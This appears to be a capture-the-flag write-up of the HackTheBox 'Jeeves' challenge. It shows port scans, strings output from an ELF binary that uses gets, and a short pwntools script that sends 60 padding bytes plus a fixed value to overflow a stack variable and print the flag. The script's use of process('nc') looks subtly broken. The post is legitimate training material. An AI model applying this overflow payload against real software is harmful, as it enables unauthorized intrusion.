---
layout: post
title:  "Jeeves-hackthebox:intro to binary exploitation"
image: ''
date:   2021-11-06 00:06:31
tags:
- hackthebox
- binary_exploitation
description: ''
categories:
- hackthebox 
---


## Given

```
host
165.227.225.205:31382

challenge description
How are you doing, sir?

some binary file
jeevs
```
I started by scanning the host
```
 nmap -Pn --min-rate 4500 --max-rtt-timeout 1500ms   165.227.225.205 -p- 
```


## analysing jeevs file 

file type
```
./jeeves: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped
```

strings out ->
```
âžœ  Desktop strings jeeves
/lib64/ld-linux-x86-64.so.2
libc.so.6
gets
printf
read
malloc
close
open
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Hello, good sir!
May I have your name?
Hello %s, hope you have a good day!
flag.txt
Pleased to make your acquaintance. Here's a small gift: %s
:*3$"
GCC: (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8055
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
src.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
printf@@GLIBC_2.2.5
close@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
gets@@GLIBC_2.2.5
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
open@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```

## jeeves data flow
``
jeeves run --> asks for name --> hello $name exits
``

## nmap output

```


Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 16:58 EET
Nmap scan report for 165.227.225.205
Host is up (0.17s latency).
Not shown: 65499 filtered ports, 35 closed ports
PORT      STATE SERVICE
31251/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.74 seconds


```


one port open

## analysing port:
`` `
 nmap -Pn -sC -sV 165.227.225.205 -p31251

```

output

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 17:00 EET
Nmap scan report for 165.227.225.205
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
31251/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Employee File Manager

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds

```


Looking into jeeves page on port 31251
![](https://i.imgur.com/qHSg99V.png)



seems same binary is deployed there
lets try connectingto it with `nc`
![](https://i.imgur.com/tNgoUQK.png)



## further analysing binary with ghidra

we realise we need 60 x a to reach the var we want

![](https://i.imgur.com/TtA2Muk.png)

so I used pwn tools witn nc

```
from pwn import *

target = process("nc")
target.sendline("209.97.187.130 32259")

payload = "A"*60
payload += p64(0x1337bab3)

target.sendline(payload)
print (target.recvuntil("}"))
```

and we get the flag
![](https://i.imgur.com/kQxpVE8.png)


```
flag
 HTB{hidden}

```
#easy
#binary


